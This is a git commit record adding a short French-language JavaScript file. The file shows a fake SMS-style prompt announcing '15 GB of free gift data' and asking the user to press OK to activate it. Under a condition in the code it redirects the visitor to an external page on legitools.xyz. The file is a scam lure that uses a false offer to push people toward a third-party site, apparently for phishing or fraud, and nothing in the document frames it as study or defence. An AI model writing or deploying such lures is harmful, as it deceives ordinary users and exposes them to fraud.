48ed71568a3bc69164e4639b39f272d292112c1b
Wesjohnson21 <mfonjohnson85@gmail.com>
2024-12-02 03:33:09 -0800

    Create 15go-donnéescadeaux.js

---
+++ 15go-donnéescadeaux.js
@@ -0,0 +1,5 @@
+var password = '15 Go de données cadeaux gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 15 Go de données cadeaux gratuites, veuillez appuyer sur OK pour ACTIVER. ','15 Go de données cadeaux gratuites');
+if (password != '15 Go de données cadeaux gratuites') {
+location.href='https://legitools.xyz/15go-donnéescadeaux.html';
+}
